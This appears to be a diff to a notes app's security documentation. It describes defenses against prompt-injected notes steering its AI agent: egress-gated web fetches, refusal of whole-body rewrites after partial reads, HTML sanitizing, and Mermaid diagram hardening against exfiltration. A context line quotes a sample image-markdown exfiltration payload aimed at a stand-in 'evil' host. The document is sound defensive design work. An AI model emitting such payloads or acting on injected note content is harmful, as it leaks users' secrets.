@@ -324,6 +324,20 @@ Cache is bypassed on cancelled requests. TTL is configurable via `AI_CACHE_TTL_S
 - **A partial read is declared, and a partial read cannot authorize a whole-body write.** `getNote` reports `contentStatus` on every note: `complete`, `truncated` (cut at the 10 000-character read bound, the content also ending in `[truncated]`) or `withheld` (the guard replaced the body with a stub). A model that received less than the whole note is therefore never in a position to claim it knows the rest: `proposeUpdateNote` refuses to replace the content of a note that was not read whole (`AGENT_WHOLE_BODY_UPDATE_REFUSED`), so a truncated read — or an injected note the guard withheld — cannot be turned into a proposal that deletes the part nobody saw. `proposeEditNote` remains available for the part the model can see.
 - **`webFetch` is egress-gated.** The agent may only fetch a URL that appeared in one of the user's own messages (any turn — user turns are victim-authored) or was returned by a `webSearch` in the same turn (per-turn allowlist); URLs fabricated from injected note or assistant content are refused. `isHttpUrl` additionally rejects private/loopback/link-local hosts (SSRF pre-emption).
 - **The assistant's rendered answer blocks images from any host but the app's blob store.** The chat markdown renderer (`apps/notes` `hardenAssistantUrl`) keeps an `<img>` source only when it points at the app's own blob store host (`isStoredImageUrl`) and drops every other one, relative, `data:` and `blob:` included, closing the zero-click `![](https://evil?d=secret)` exfiltration channel; outbound links pass through a link-safety confirmation.
+- **LLM-written HTML keeps only what the note schema reads.** Summaries, voice notes, copilot proposals and AI inserts go through one DOMPurify allowlist (`AI_HTML_PURIFY_CONFIG` and `createAiHtmlPurifier`, `@knowtis/editor`): headings, lists and task lists, tables, code, quotes, rules, marks, links and mermaid blocks. Anything else is dropped, including `<style>`, media, embeds, SVG, MathML, form controls and `style`/`src`/`background` attributes. Images come back only in `sanitizeProposalHtml`, and only from the blob store.
+- **A mermaid diagram loads nothing, and neither does the page drawing it.** Anyone who can write the note can author a diagram: a collaborator, the copilot, or a pasted note. Mermaid attaches the drawing to the live document to measure it, so rendering alone is an exfiltration channel. `renderMermaid` (`packages/editor/src/extensions/mermaid-block/renderMermaid.ts`) produces the SVG that both the inline view and the fullscreen viewer inject, and it has three layers:
+  - **Labels** go through Mermaid's own `dompurifyConfig` before Mermaid attaches them. It keeps HTML and MathML only: no `img`, no `style` elements or attributes, and no `src`, `srcset`, `poster` or `background`.
+  - **`secure`** stops front matter and `%%{init}%%` directives from setting the config keys whose values reach CSS or a fill/stroke: `themeCSS`, `themeVariables`, `fontFamily`, `altFontFamily`, all of `c4`, `titleColor`, `linkColor`, `width`, `leftMargin`, `chartWidth`, `marginLeft` and `marginRight`. A spec sets every settable key to an injected `url()`, so a Mermaid upgrade that adds another one fails CI.
+  - **`stripResourceLoads`** removes from the returned SVG every loading attribute, every reference to another document, and every CSS `url()`, `image-set()` or `@import` that isn't a `#fragment`. Inline `data:image/` on `<image>` stays, because C4 draws its icons with it.
+
+  Some diagram statements carry CSS or an image URL themselves and fire while Mermaid draws, before any of these layers can act. They are left to the `img-src` CSP in `vercel.json`:
+  - state `classDef`
+  - class `style`
+  - block `style` and `classDef`
+  - C4 `UpdateElementStyle` and `UpdateRelStyle`
+  - the flowchart image shape `A@{ img: "…" }`, which Mermaid fetches with `new Image()`
+
+  The injected SVG never holds any of them.
 
 ---
 
